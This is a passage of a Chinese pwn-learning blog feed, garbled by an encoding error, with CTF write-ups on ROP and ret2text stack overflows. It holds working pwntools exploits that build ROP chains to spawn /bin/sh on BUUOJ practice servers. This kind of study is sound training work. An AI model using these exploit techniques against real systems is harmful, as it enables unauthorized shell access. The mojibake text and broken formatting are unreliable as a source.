<h3 id="æœ‰å…³ç³»ç»Ÿè°ƒç”¨çš„çŸ¥è¯†"><a href="#æœ‰å…³ç³»ç»Ÿè°ƒç”¨çš„çŸ¥è¯†" class="headerlink" title="æœ‰å…³ç³»ç»Ÿè°ƒç”¨çš„çŸ¥è¯†"></a>æœ‰å…³ç³»ç»Ÿè°ƒç”¨çš„çŸ¥è¯†</h3><h4 id="32ä½"><a href="#32ä½" class="headerlink" title="32ä½"></a><code>32</code>ä½</h4><p>â€‹	<code>32</code>ä½ç³»ç»Ÿè°ƒç”¨çš„å‰<code>6</code>ä¸ªå¯„å­˜å™¨åˆ†åˆ«ä¸º<code>ebx,ecx,edx,esi,edi,ebp</code>ã€‚é€šè¿‡æŸ¥çœ‹<code>/usr/include/x86_64-linux-gnu/asm/unistd_32.h32</code>æ–‡ä»¶ï¼Œæˆ‘ä»¬å¯ä»¥æ‰¾åˆ°å‡½æ•°çš„ç³»ç»Ÿè°ƒç”¨å·ã€‚</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line"></span><br><span class="line">1ã€æŠŠå‡½æ•°çš„ç³»ç»Ÿè°ƒç”¨å·æ”¾å…¥```eax```å¯„å­˜å™¨ä¸­</span><br><span class="line"></span><br><span class="line">2ã€æŠŠå‡½æ•°å‚æ•°ä¾æ¬¡æ”¾å…¥å¯„å­˜å™¨ä¸­</span><br><span class="line"></span><br><span class="line">3ã€æ‰§è¡Œ```int 0x80```æŒ‡ä»¤ä¸­æ–­</span><br><span class="line"></span><br><span class="line">#### ```64```ä½</span><br><span class="line"></span><br><span class="line">â€‹	```64```ä½ç³»ç»Ÿè°ƒç”¨çš„å‰```6```ä¸ªå¯„å­˜å™¨åˆ†åˆ«ä¸º```rdi,rsi,rdx,rcx,r8,r9```ã€‚é€šè¿‡æŸ¥çœ‹```/usr/include/x86_64-linux-gnu/asm/unistd_64.h```æ–‡ä»¶ï¼Œæˆ‘ä»¬å¯ä»¥æ‰¾åˆ°å‡½æ•°çš„ç³»ç»Ÿè°ƒç”¨å·ã€‚</span><br><span class="line"></span><br><span class="line">```64```ä½åº”ç”¨ç¨‹åºè°ƒç”¨ç³»ç»Ÿè°ƒç”¨çš„è¿‡ç¨‹ï¼š</span><br><span class="line"></span><br><span class="line">1ã€æŠŠå‡½æ•°çš„ç³»ç»Ÿè°ƒç”¨å·æ”¾å…¥```rax```å¯„å­˜å™¨ä¸­</span><br><span class="line"></span><br><span class="line">2ã€æŠŠå‡½æ•°å‚æ•°æ­¤æ¬¡æ”¾å…¥å¯„å­˜å™¨ä¸­</span><br><span class="line"></span><br><span class="line">3ã€æ‰§è¡Œ```syscall```æŒ‡ä»¤</span><br><span class="line"></span><br><span class="line">## ä¾‹é¢˜</span><br><span class="line"></span><br><span class="line">###  ```inndy_rop```</span><br><span class="line"></span><br><span class="line">æ‹¿åˆ°é¢˜çš„ç¬¬ä¸€æ­¥ï¼Œå…ˆæ£€æŸ¥ä¸€ä¸‹ä¿æŠ¤ï¼Œåªå¼€äº†```NX```ä¿æŠ¤ï¼Œå¹¶ä¸”å¯çŸ¥è¯¥ç¨‹åºæ˜¯```32```ä½çš„ã€‚</span><br><span class="line"></span><br><span class="line">![image-20231209145936854](https://raw.githubusercontent.com/Qwen11/picture/main/202503132354775.png)</span><br><span class="line"></span><br><span class="line">æ‹–å…¥```ida```ä¸­ï¼Œæœ‰```gets```å‡½æ•°ï¼Œå¯ä»¥æ ˆæº¢å‡º</span><br><span class="line"></span><br><span class="line">![image-20231209162919247](https://raw.githubusercontent.com/Qwen11/picture/main/202503132354081.png)</span><br><span class="line"></span><br><span class="line">è®¡ç®—åç§»é‡ä¸º```0x10```</span><br><span class="line"></span><br><span class="line">![image-20231209232158602](https://raw.githubusercontent.com/Qwen11/picture/main/202503132354890.png)</span><br><span class="line"></span><br><span class="line">```syscall```çš„å‡½æ•°è°ƒç”¨è§„èŒƒä¸º```execve(&quot;/bin/sh&quot;,0,0)```ï¼Œ```execve```å‡½æ•°çš„ç³»ç»Ÿè°ƒç”¨å·ä¸º```11```ã€‚</span><br><span class="line"></span><br><span class="line">æˆ‘ä»¬å…ˆæ‰¾åˆ°ç›¸å…³çš„```gadgets```åœ°å€ï¼Œç”¨```ROPgadget --binary rop | grep &quot;pop eax ; ret&quot;```å‘½ä»¤å¯»æ‰¾```pop eax ; ret```ï¼Œå…¶ä»–åŒç†</span><br><span class="line"></span><br><span class="line">![image-20231209164349380](https://raw.githubusercontent.com/Qwen11/picture/main/202503132354758.png)</span><br><span class="line"></span><br><span class="line">![image-20231209164436996](https://raw.githubusercontent.com/Qwen11/picture/main/202503132354412.png)</span><br><span class="line"></span><br><span class="line">![image-20231209164618437](https://raw.githubusercontent.com/Qwen11/picture/main/202503132354139.png)</span><br><span class="line"></span><br><span class="line">![image-20231209164548872](https://raw.githubusercontent.com/Qwen11/picture/main/202503132354570.png)</span><br><span class="line"></span><br><span class="line">```int 0x80```æŒ‡ä»¤çš„åœ°å€</span><br><span class="line"></span><br><span class="line">![image-20231209165637692](https://raw.githubusercontent.com/Qwen11/picture/main/202503132354935.png)</span><br><span class="line"></span><br><span class="line">æˆ‘ä»¬è¿˜éœ€è¦æ‰¾åˆ°```pop dword ptr [ecx] ; ret```çš„åœ°å€ï¼ˆä¹Ÿå¯ä»¥æ˜¯å…¶ä»–æ™®é€šå¯„å­˜å™¨ï¼Œä¸è¿‡è¿™é‡Œæˆ‘ä»¬åªèƒ½æ‰¾åˆ°```ecx```çš„ã€‚```pop dword ptr [ecx]```çš„æ„æ€æ˜¯**æŠŠæ ˆé¡¶çš„å†…å®¹å¼¹åˆ°æŒ‡é’ˆæŒ‡çš„```ecx```ä¸­ä¿å­˜çš„å€¼ä½œä¸ºçš„åœ°å€**ï¼‰ï¼Œåˆ©ç”¨å‘½ä»¤ï¼š```ROPgadget --binary rop | grep &quot;pop dword ptr \[ecx\] ; ret&quot;```ï¼Œæ³¨æ„è¦ç”¨åæ–œæ è¿›è¡Œè½¬ä¹‰</span><br><span class="line"></span><br><span class="line">![image-20231209203524019](https://raw.githubusercontent.com/Qwen11/picture/main/202503132355878.png)</span><br><span class="line"></span><br><span class="line">```bss```æ®µçš„åœ°å€```0x080eafb8```ï¼Œæˆ‘ä»¬è¦æŠŠ```/bin/sh```å†™å…¥```bss```æ®µ</span><br><span class="line"></span><br><span class="line">![image-20231209170118582](https://raw.githubusercontent.com/Qwen11/picture/main/202503132355914.png)</span><br><span class="line"></span><br><span class="line">è¿™é‡Œæ”¾ä¸€å¼ å¸ˆçˆ¶çš„å›¾ç‰‡ï¼Œé€šè¿‡è¿™å¼ å›¾ç‰‡å¯ä»¥äº†è§£æŠŠ```/bin/sh```å†™å…¥```bss```æ®µçš„è¿‡ç¨‹ï¼Œç„¶åä¸‹é¢çš„```exp```ä¸­æˆ‘å†™äº†ç›¸åº”çš„è§£é‡Šã€‚</span><br><span class="line"></span><br><span class="line">![img](https://raw.githubusercontent.com/Qwen11/picture/main/202503132355926.png)</span><br><span class="line"></span><br><span class="line">#### ```exp```</span><br><span class="line"></span><br><span class="line">```python</span><br><span class="line">from pwn import *</span><br><span class="line"></span><br><span class="line">p = remote(&quot;node4.buuoj.cn&quot;,27738)</span><br><span class="line">#p = process(&#x27;./rop&#x27;)</span><br><span class="line">context(arch=&#x27;i386&#x27;,os=&#x27;linux&#x27;,log_level=&#x27;debug&#x27;)</span><br><span class="line"></span><br><span class="line">int_0x80_addr=0x0806c943</span><br><span class="line">bss_addr=0x080eafb8</span><br><span class="line">pop_eax_addr = 0x080b8016</span><br><span class="line">pop_ebx_addr = 0x080481c9</span><br><span class="line">pop_ecx_addr = 0x080de769</span><br><span class="line">pop_edx_addr = 0x0806ecda</span><br><span class="line">pop_in_ecx_addr=0x0804b5ba           #æŒ‡å‘ecxå¯„å­˜å™¨ä¸­çš„å†…å®¹</span><br><span class="line"></span><br><span class="line">payload=b&#x27;a&#x27;*0x10   #æ ˆæº¢å‡º</span><br><span class="line"></span><br><span class="line">payload+=p32(pop_ecx_addr)+p32(bss_addr)   #å…ˆæŠŠbss_addrè¿™ä¸ªåœ°å€å¼¹åˆ°ecxä¸­</span><br><span class="line">payload+=p32(pop_in_ecx_addr)+b&#x27;/bin&#x27;   #ecxä¸­çš„å†…å®¹ä½œä¸ºåœ°å€ï¼Œ/binè¢«å†™å…¥è¿™ä¸ªåœ°å€é‡Œï¼Œå³è¢«å†™åˆ°bss_addrè¿™ä¸ªåœ°å€ä¸­</span><br><span class="line">payload+=p32(pop_ecx_addr)+p32(bss_addr+4)   #è¿™ä¸ªbss_addr+4æ˜¯ä¸Šé¢bss_addrçš„åœ°å€çš„è¡”æ¥ï¼Œå› ä¸ºå‚æ•°/bin/shéœ€è¦ä¸¤ä¸ªå†…å­˜å•å…ƒå­˜æ”¾ï¼Œå› æ­¤åœ¨è¿™é‡Œå°†ä¸Šé¢çš„åœ°å€åŠ 4ï¼Œ/shå°±å­˜åˆ°äº†ä¸‹é¢çš„å†…å­˜å•å…ƒã€‚</span><br><span class="line">payload+=p32(pop_in_ecx_addr)+b&#x27;/sh\x00&#x27;   #å‰é¢åŒç†ï¼Œæœ€åçš„\x00ç”¨æ¥å£°æ˜å­—ç¬¦ä¸²çš„ç»“æŸ</span><br><span class="line"></span><br><span class="line">payload+=p32(pop_eax_addr)+p32(0xb)   #æŠŠç³»ç»Ÿè°ƒç”¨å·å¼¹åˆ°eaxä¸­</span><br><span class="line">payload+=p32(pop_ebx_addr)+p32(bss_addr)  #æŠŠç¬¬ä¸€ä¸ªå‚æ•°çš„åœ°å€å¼¹åˆ°ebxä¸­</span><br><span class="line">payload+=p32(pop_ecx_addr)+p32(0)   #æŠŠç¬¬äºŒä¸ªå‚æ•°å¼¹åˆ°ecxä¸­</span><br><span class="line">payload+=p32(pop_edx_addr)+p32(0)   #æŠŠç¬¬ä¸‰ä¸ªå‚æ•°å¼¹åˆ°edxä¸­</span><br><span class="line">payload+=p32(int_0x80_addr)   #æ‰§è¡Œint 0x80ä¸­æ–­</span><br><span class="line">p.sendline(payload)</span><br><span class="line">p.interactive()</span><br></pre></td></tr></table></figure>

<p>å¾—åˆ°<code>flag</code></p>
<p><img src="https://raw.githubusercontent.com/Qwen11/picture/main/202503132355886.png" alt="image-20231209175629929"></p>
<h3 id="cmcc-simplerop"><a href="#cmcc-simplerop" class="headerlink" title="cmcc_simplerop"></a><code>cmcc_simplerop</code></h3><p>æ‹¿åˆ°é¢˜ç›®ï¼Œå…ˆçœ‹ä¿æŠ¤ï¼Œå¼€äº†<code>NX</code>ä¿æŠ¤ï¼Œæ˜¯<code>32</code>ä½ç¨‹åº</p>
<p><img src="https://raw.githubusercontent.com/Qwen11/picture/main/202503132355752.png" alt="image-20231209195656602"></p>
<p>æ‹–å…¥<code>ida</code>ï¼Œæœ‰<code>read</code>å‡½æ•°ï¼Œå¯ä»¥æ ˆæº¢å‡º</p>
<p><img src="https://raw.githubusercontent.com/Qwen11/picture/main/202503132355365.png" alt="image-20231209195945310"></p>
<p>è®¡ç®—åç§»é‡ï¼Œè¿™é‡Œç”¨<code>cyclic</code>è®¡ç®—åç§»é‡ï¼Œå…ˆå¤åˆ¶<code>200</code>ä¸ªåƒåœ¾æ•°æ®</p>
<p><img src="https://raw.githubusercontent.com/Qwen11/picture/main/202503132355025.png" alt="image-20231210000043823"></p>
<p>è¾“å…¥</p>
<p><img src="https://raw.githubusercontent.com/Qwen11/picture/main/202503132355656.png" alt="image-20231210000145966"></p>
<p>ç„¶åç”¨<code>cyclic -l 0x61616169</code>è®¡ç®—åç§»é‡ä¸º<code>32</code>å³<code>0x20</code></p>
<p><img src="https://raw.githubusercontent.com/Qwen11/picture/main/202503132356455.png" alt="image-20231209235925156"></p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line"></span><br><span class="line">è¿™é‡Œæˆ‘ä»¬æ‰¾ä¸åˆ°ç±»ä¼¼ä¸Šä¸€é¢˜ä¸­```pop dword ptr [ecx] ; ret```çš„```gadgets```ï¼Œå› æ­¤æˆ‘ä»¬è¦ç”¨å…¶ä»–æ–¹æ³•æŠŠ```/bin/sh```å†™å…¥```bss```æ®µã€‚æˆ‘ä»¬å¯ä»¥åˆ©ç”¨ç¨‹åºä¸­ç°æœ‰çš„```read```å‡½æ•°ï¼Œæ¥å®Œæˆè¿™ä¸€æ­¥ã€‚</span><br><span class="line"></span><br><span class="line">```read```å‡½æ•°åœ°å€</span><br><span class="line"></span><br><span class="line">![image-20231209212415936](https://raw.githubusercontent.com/Qwen11/picture/main/202503132356365.png)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"></span><br><span class="line">```bss```æ®µçš„åœ°å€```0x080eb2a1```</span><br><span class="line"></span><br><span class="line">![image-20231209210856820](https://raw.githubusercontent.com/Qwen11/picture/main/202503132356616.png)</span><br><span class="line"></span><br><span class="line">ç”¨```ROPgadget --binary simplerop | grep &quot;int 0x80&quot;```å‘½ä»¤æ‰¾åˆ°```int 0x80```æŒ‡ä»¤åœ°å€</span><br><span class="line"></span><br><span class="line">![image-20231209202038108](https://raw.githubusercontent.com/Qwen11/picture/main/202503132356455.png)</span><br><span class="line"></span><br><span class="line">å¯»æ‰¾```gadgets```</span><br><span class="line"></span><br><span class="line">![image-20231209205944371](https://raw.githubusercontent.com/Qwen11/picture/main/202503132356774.png)</span><br><span class="line"></span><br><span class="line">![image-20231209210024201](https://raw.githubusercontent.com/Qwen11/picture/main/202503132356145.png)</span><br><span class="line"></span><br><span class="line">æ²¡æœ‰æ‰¾åˆ°```pop ecx ; ret```ï¼Œä½†æ˜¯æœ‰```pop edx ; pop ecx ; pop ebx ; ret```ï¼Œæ›´å¥½äº†</span><br><span class="line"></span><br><span class="line">![image-20231209210337839](https://raw.githubusercontent.com/Qwen11/picture/main/202503132356930.png)</span><br><span class="line"></span><br><span class="line">#### ```exp```</span><br><span class="line"></span><br><span class="line">```python</span><br><span class="line">from pwn import *</span><br><span class="line">#p = process(&#x27;./simplerop&#x27;)</span><br><span class="line">p = remote(&quot;node4.buuoj.cn&quot;,28283)</span><br><span class="line">context(arch=&#x27;i386&#x27;,os=&#x27;linux&#x27;,log_level=&#x27;debug&#x27;)</span><br><span class="line"></span><br><span class="line">bss_addr = 0x080eb2a1</span><br><span class="line">int_0x80_addr = 0x080493e1</span><br><span class="line">pop_eax_addr = 0x080bae06</span><br><span class="line">pop_edx_ecx_ebx_addr = 0x0806e850</span><br><span class="line">read_addr = 0x0806cd50</span><br><span class="line">payload = b&#x27;a&#x27;*0x20</span><br><span class="line"></span><br><span class="line">payload += p32(read_addr)+p32(pop_edx_ecx_ebx_addr)#å…ˆæŠŠreadå‡½æ•°åŸæ¥çš„3ä¸ªå‚æ•°å¼¹å‡º</span><br><span class="line">payload += p32(0)+p32(bss_addr)+p32(8)#å†™å…¥readå‡½æ•°çš„å‚æ•°</span><br><span class="line"></span><br><span class="line">payload += p32(pop_eax_addr)+p32(0xb)#æŠŠç³»ç»Ÿè°ƒç”¨å·å¼¹åˆ°eaxä¸­</span><br><span class="line">payload += p32(pop_edx_ecx_ebx_addr)+p32(0)+p32(0)+p32(bss_addr)#æŠŠexecveå‡½æ•°çš„3ä¸ªå‚æ•°åˆ†åˆ«å¼¹åˆ°ebxï¼Œecxï¼Œedxä¸­</span><br><span class="line">payload += p32(int_0x80_addr)#æ‰§è¡Œint 0x80ä¸­æ–­</span><br><span class="line">p.sendline(payload)</span><br><span class="line">p.sendline(&#x27;/bin/sh\x00&#x27;)#è¿™é‡Œä¸€å®šè¦è¾“å…¥\x00å»æˆªæ–­</span><br><span class="line">p.interactive()</span><br></pre></td></tr></table></figure>

<p>å¾—åˆ°<code>flag</code></p>
<p><img src="https://raw.githubusercontent.com/Qwen11/picture/main/202503132356863.png" alt="image-20231209214613569"></p>
<h3 id="picoctf-2018-can-you-gets-me"><a href="#picoctf-2018-can-you-gets-me" class="headerlink" title="picoctf_2018_can_you_gets_me"></a><code>picoctf_2018_can_you_gets_me</code></h3><p>æ‹¿åˆ°é¢˜ç›®ï¼Œå…ˆæŸ¥çœ‹ä¿æŠ¤ï¼Œåªå¼€äº†<code>NX</code>ä¿æŠ¤ï¼Œæ˜¯<code>32</code>ä½ç¨‹åº</p>
<p><img src="https://raw.githubusercontent.com/Qwen11/picture/main/202503132356211.png" alt="image-20231209215403163"></p>
<p>æ‹–å…¥<code>ida</code>ä¸­ï¼Œæœ‰<code>gets</code>å‡½æ•°ï¼Œå¯ä»¥æ ˆæº¢å‡º</p>
<p><img src="https://raw.githubusercontent.com/Qwen11/picture/main/202503132356785.png" alt="image-20231209220934817"></p>
<p>é€‰ä¸€ä¸ª<code>bss</code>æ®µçš„åœ°å€ä¸º<code>0x080eba35</code></p>
<p><img src="https://raw.githubusercontent.com/Qwen11/picture/main/202503132356751.png" alt="image-20231209221129336"></p>
<p>ç”¨<code>gdb</code>è°ƒè¯•è®¡ç®—åç§»é‡ä¸º<code>0x1c</code></p>
<p><img src="https://raw.githubusercontent.com/Qwen11/picture/main/202503132356700.png" alt="image-20231209231510597"></p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line"></span><br><span class="line">å¯»æ‰¾```gadgets```ç‰‡æ®µ</span><br><span class="line"></span><br><span class="line">![image-20231209215819672](https://raw.githubusercontent.com/Qwen11/picture/main/202503132357083.png)</span><br><span class="line"></span><br><span class="line">![image-20231209215908598](https://raw.githubusercontent.com/Qwen11/picture/main/202503132357063.png)</span><br><span class="line"></span><br><span class="line">![image-20231209215943969](https://raw.githubusercontent.com/Qwen11/picture/main/202503132357679.png)</span><br><span class="line"></span><br><span class="line">![image-20231209220018062](https://raw.githubusercontent.com/Qwen11/picture/main/202503132357248.png)</span><br><span class="line"></span><br><span class="line">![image-20231209220149329](https://raw.githubusercontent.com/Qwen11/picture/main/202503132357044.png)</span><br><span class="line"></span><br><span class="line">å¯»æ‰¾```int 0x80```ä¸­æ–­æŒ‡ä»¤</span><br><span class="line"></span><br><span class="line">![image-20231209220226939](https://raw.githubusercontent.com/Qwen11/picture/main/202503132357595.png)</span><br><span class="line"></span><br><span class="line">#### ```exp```</span><br><span class="line"></span><br><span class="line">```python</span><br><span class="line">from pwn import *</span><br><span class="line">p = process(&#x27;./rop3&#x27;)</span><br><span class="line">p = remote(&quot;node4.buuoj.cn&quot;,26246)</span><br><span class="line">context(arch=&#x27;i386&#x27;,os=&#x27;linux&#x27;,log_level=&#x27;debug&#x27;)</span><br><span class="line"></span><br><span class="line">pop_eax_addr = 0x080b81c6</span><br><span class="line">pop_ebx_addr = 0x080481c9</span><br><span class="line">pop_ecx_addr = 0x080de955</span><br><span class="line">pop_edx_addr = 0x0806f02a</span><br><span class="line">pop_in_ecx_addr = 0x0804b5ea</span><br><span class="line">int_0x80_addr = 0x0806cc25</span><br><span class="line">bss_addr = 0x080eba35</span><br><span class="line"></span><br><span class="line">payload = b&#x27;a&#x27;*(0x1c)</span><br><span class="line">payload += p32(pop_ecx_addr)+p32(bss_addr)+p32(pop_in_ecx_addr)+b&#x27;/bin&#x27;</span><br><span class="line">payload += p32(pop_ecx_addr)+p32(bss_addr+4)+p32(pop_in_ecx_addr)+b&#x27;/sh\x00&#x27;</span><br><span class="line"></span><br><span class="line">payload += p32(pop_eax_addr)+p32(0xb)</span><br><span class="line">payload += p32(pop_ebx_addr)+p32(bss_addr)</span><br><span class="line">payload += p32(pop_ecx_addr)+p32(0)</span><br><span class="line">payload += p32(pop_edx_addr)+p32(0)</span><br><span class="line">payload += p32(int_0x80_addr)</span><br><span class="line">p.sendline(payload)</span><br><span class="line">p.interactive()</span><br></pre></td></tr></table></figure>

<p>å¾—åˆ°<code>flag</code></p>
<p><img src="https://raw.githubusercontent.com/Qwen11/picture/main/202503132357205.png" alt="image-20231209222917217"></p>
]]></content>
      <categories>
        <category>pwnå­¦ä¹ æ€»ç»“</category>
      </categories>
      <tags>
        <tag>pwn</tag>
        <tag>æ ˆ</tag>
      </tags>
  </entry>
  <entry>
    <title>ret2textå­¦ä¹ æ€»ç»“</title>
    <url>/2023/12/07/ret2text%E5%AD%A6%E4%B9%A0%E6%80%BB%E7%BB%93/</url>
    <content><![CDATA[<h2 id="å‰æçŸ¥è¯†"><a href="#å‰æçŸ¥è¯†" class="headerlink" title="å‰æçŸ¥è¯†"></a>å‰æçŸ¥è¯†</h2><h3 id="ä»€ä¹ˆæ˜¯ret2text"><a href="#ä»€ä¹ˆæ˜¯ret2text" class="headerlink" title="ä»€ä¹ˆæ˜¯ret2text"></a>ä»€ä¹ˆæ˜¯<code>ret2text</code></h3><p>â€‹	<code>ret2text</code>ï¼Œå³<code>return to text</code>ï¼Œæ„æ€æ˜¯åŠ«æŒå‡½æ•°è¿”å›åœ°å€ä¸ºç¨‹åºæœ¬èº«å°±æœ‰çš„ä»£ç (<code>.text</code>)ï¼Œè¿›è€Œæ§åˆ¶ç¨‹åºæ‰§è¡Œåé—¨å‡½æ•°ï¼Œæ‹¿åˆ°<code>shell</code>ã€‚</p>
<h3 id="strcpyå‡½æ•°æº¢å‡º"><a href="#strcpyå‡½æ•°æº¢å‡º" class="headerlink" title="strcpyå‡½æ•°æº¢å‡º"></a><code>strcpy</code>å‡½æ•°æº¢å‡º</h3><ul>
<li><p>å½“æºå­—ç¬¦ä¸²çš„é•¿åº¦å¤§äºç›®æ ‡ç¼“å†²åŒºæ—¶ï¼Œ<code>strcpy</code>å‡½æ•°ä¼šå¤åˆ¶æ•´ä¸ªæºå­—ç¬¦ä¸²ï¼Œå¯¼è‡´æ ˆæº¢å‡ºã€‚</p>
<span id="more"></span>
</li>
<li><p><code>strcpy</code>å‡½æ•°åŸå‹</p>
</li>
</ul>
<figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="type">char</span>* <span class="title function_">strcpy</span><span class="params">(<span class="type">char</span>* destination,<span class="type">const</span> <span class="type">char</span>* source)</span>;</span><br><span class="line"><span class="comment">//destinationæŒ‡å‘è¦å¤åˆ¶çš„ç›®æ ‡ç¼“å†²åŒº</span></span><br><span class="line"><span class="comment">//sourceæŒ‡å‘è¢«å¤åˆ¶çš„æºå­—ç¬¦ä¸²</span></span><br></pre></td></tr></table></figure>

<h3 id="ret2texté¢˜ç›®ç±»å‹"><a href="#ret2texté¢˜ç›®ç±»å‹" class="headerlink" title="ret2texté¢˜ç›®ç±»å‹"></a><code>ret2text</code>é¢˜ç›®ç±»å‹</h3><p>â€‹	ç¬¬ä¸€ç§æ˜¯ç›´æ¥åŠ«æŒè¿”å›åœ°å€ä¸º<code>system(&quot;/bin/sh&quot;)</code>çš„åœ°å€ã€‚</p>
<p>â€‹	ç¬¬äºŒç§æ¯”ç¬¬ä¸€ç§ç¨å¾®å¤æ‚äº†ä¸€äº›ï¼Œè™½ç„¶æœ‰<code>system</code>å‡½æ•°ä½†æ˜¯å‚æ•°ä¸æ˜¯æˆ‘ä»¬æƒ³è¦çš„ ï¼Œè€Œåœ¨ç¨‹åºçš„å…¶ä»–åœ°æ–¹ä¹Ÿèƒ½æ‰¾åˆ°<code>/bin/sh</code>å­—ç¬¦ä¸²ã€‚è¿™æ—¶å°±éœ€è¦åˆ©ç”¨ä¸€äº›<code>gadget</code>ç»™<code>system</code>å‡½æ•°ä¼ å‚ã€‚è€Œ64ä½ç¨‹åºå’Œ32ä½ç¨‹åºäºŒè€…çš„ä¼ å‚æ–¹å¼ä¹Ÿä¸åŒã€‚</p>
<h3 id="64ä½ç¨‹åºå’Œ32ä½ç¨‹åºåœ¨å‡½æ•°ä¼ å‚ä¸Šçš„ä¸åŒ"><a href="#64ä½ç¨‹åºå’Œ32ä½ç¨‹åºåœ¨å‡½æ•°ä¼ å‚ä¸Šçš„ä¸åŒ" class="headerlink" title="64ä½ç¨‹åºå’Œ32ä½ç¨‹åºåœ¨å‡½æ•°ä¼ å‚ä¸Šçš„ä¸åŒ"></a>64ä½ç¨‹åºå’Œ32ä½ç¨‹åºåœ¨å‡½æ•°ä¼ å‚ä¸Šçš„ä¸åŒ</h3><p>â€‹	32ä½ç¨‹åºå‡½æ•°ä¼ å‚æ—¶ï¼Œä½¿ç”¨æ ˆæ¥ä¼ é€’å‚æ•°ï¼ˆå¦‚<code>_cdecl</code>å’Œ<code>_stdcall</code>ï¼‰ï¼Œå‚æ•°ä»å³å¾€å·¦å‹å…¥æ ˆï¼Œç„¶åæ‰§è¡Œ<code>call</code>æŒ‡ä»¤è·³è½¬åˆ°è¦æ‰§è¡Œçš„å‡½æ•°çš„ä½ç½®ã€‚å› æ­¤æˆ‘ä»¬æ”»å‡»æ—¶åªéœ€æ„é€ ä¸€ä¸ªæ ˆç»“æ„å³å¯ã€‚</p>
<p>â€‹	64ä½ç¨‹åºå‡½æ•°ä¼ å‚æ—¶ï¼Œå…ˆä½¿ç”¨å¯„å­˜å™¨æ¥å­˜å‚¨å‚æ•°ï¼Œä¸€å…±æœ‰6ä¸ªå­˜æ”¾å‚æ•°çš„å¯„å­˜å™¨åˆ†åˆ«ä¸º<code>rdi,rsi,rdx,rcx,r8,r9</code>ï¼Œå½“å‚æ•°å¤§äº6ä¸ªæ—¶å¤šä½™çš„å‚æ•°æ‰é€šè¿‡æ ˆä¼ é€’ã€‚</p>
<h3 id="gadget"><a href="#gadget" class="headerlink" title="gadget"></a><code>gadget</code></h3><p>â€‹	<code>gadget</code>é€šå¸¸æ˜¯ä»¥<code>ret</code>ç»“å°¾çš„æŒ‡ä»¤åºåˆ—ï¼Œå¦‚<code>pop rdi ; ret</code>ï¼Œç”¨äºè®¾ç½®å¯„å­˜å™¨çš„å€¼ã€‚åœ¨è¿™é‡Œï¼Œæˆ‘ä»¬ç”¨<code>pop rdi ; ret</code>æŠŠ<code>/bin/sh</code>æ”¾å…¥<code>rdi</code>å¯„å­˜å™¨ä¸­ã€‚</p>
<h2 id="ä¾‹é¢˜"><a href="#ä¾‹é¢˜" class="headerlink" title="ä¾‹é¢˜"></a>ä¾‹é¢˜</h2><h3 id="ä¾‹é¢˜1ï¼šbuu-jarvisoj-level0"><a href="#ä¾‹é¢˜1ï¼šbuu-jarvisoj-level0" class="headerlink" title="ä¾‹é¢˜1ï¼šbuu  jarvisoj_level0"></a><strong>ä¾‹é¢˜1</strong>ï¼š<code>buu</code>  <code>jarvisoj_level0</code></h3><p>æ‹¿åˆ°é¢˜ç›®åå…ˆ<code>checksec level0</code>å‘½ä»¤æ£€æŸ¥ä¸€ä¸‹ä¿æŠ¤ï¼Œ<code>PIE</code>å’Œ<code>canary</code>éƒ½æ²¡å¼€ï¼Œå¼€äº†<code>NX</code>ï¼ˆå †æ ˆä¸æ‰§è¡Œï¼‰ä¿æŠ¤ã€‚è¯¥ç¨‹åºä¸º64ä½ã€‚</p>
<blockquote>
<p>â€‹	<strong><code>canary</code>ä¿æŠ¤ï¼šå‡½æ•°å¼€å§‹æ‰§è¡Œçš„æ—¶å€™ä¼šå…ˆå¾€æ ˆé‡Œæ’å…¥<code>canary</code>å€¼ï¼Œå½“å‡½æ•°çœŸæ­£è¿”å›çš„æ—¶å€™ä¼šéªŒè¯<code>canary</code>å€¼æ˜¯å¦åˆæ³•ï¼Œå¦‚æœä¸åˆæ³•å°±åœæ­¢ç¨‹åºè¿è¡Œã€‚å¯ä»¥é˜²æ­¢æ ˆæº¢å‡ºè¦†ç›–è¿”å›åœ°å€ã€‚</strong></p>
</blockquote>
<img src="https://raw.githubusercontent.com/Qwen11/picture/main/202503132359646.png" alt="image-20231207130909272" style="zoom:80%;" />

<p><img src="https://raw.githubusercontent.com/Qwen11/picture/main/202503132359254.png" alt="image-20231207131026174"></p>
<p>å®šä¹‰æ•°ç»„<code>buf[128]</code>,<code>read</code>å‡½æ•°è¯»å–ï¼Œä¸”<code>0x200uLL</code>å¤§äº128ï¼Œå¯ä»¥æ ˆæº¢å‡ºã€‚é€šè¿‡ä¸‹å›¾</p>
<p><img src="https://raw.githubusercontent.com/Qwen11/picture/main/202503132359093.png" alt="image-20231207131620028"></p>
<p>è®¡ç®—åç§»é‡ï¼Œä¸º0x80+8</p>
<p><img src="https://raw.githubusercontent.com/Qwen11/picture/main/202503132359586.png" alt="image-20231207131114573"></p>
<p><img src="https://raw.githubusercontent.com/Qwen11/picture/main/202503140001740.png" alt="image-20231207131155073"></p>
<p>è¯¥é¢˜æ˜¯ç¬¬ä¸€ç§ç±»å‹ï¼Œç›´æ¥æº¢å‡ºå¹¶åŠ«æŒè¿”å›åœ°å€ä¸º<code>system</code>å‡½æ•°åœ°å€0x400596ï¼Œå³å¯ã€‚</p>
<p><img src="https://raw.githubusercontent.com/Qwen11/picture/main/202503132359141.png" alt="image-20231207132517025"></p>
<p>æœ€å<code>exp</code></p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line"></span><br><span class="line">p = remote(<span class="string">&quot;node4.buuoj.cn&quot;</span>,<span class="number">27059</span>)</span><br><span class="line">context(arch=<span class="string">&#x27;amd64&#x27;</span>,os=<span class="string">&#x27;linux&#x27;</span>,log_level=<span class="string">&#x27;debug&#x27;</span>)</span><br><span class="line"></span><br><span class="line">system_addr = <span class="number">0x400596</span></span><br><span class="line"></span><br><span class="line">payload = <span class="string">b&#x27;a&#x27;</span>*(<span class="number">0x80</span>+<span class="number">8</span>)+p64(system_addr)</span><br><span class="line"></span><br><span class="line">p.sendline(payload)</span><br><span class="line"></span><br><span class="line">p.interactive()</span><br></pre></td></tr></table></figure>

<p>å¾—åˆ°<code>flag</code></p>
<p><img src="https://raw.githubusercontent.com/Qwen11/picture/main/202503132359026.png" alt="image-20231207132411895"></p>
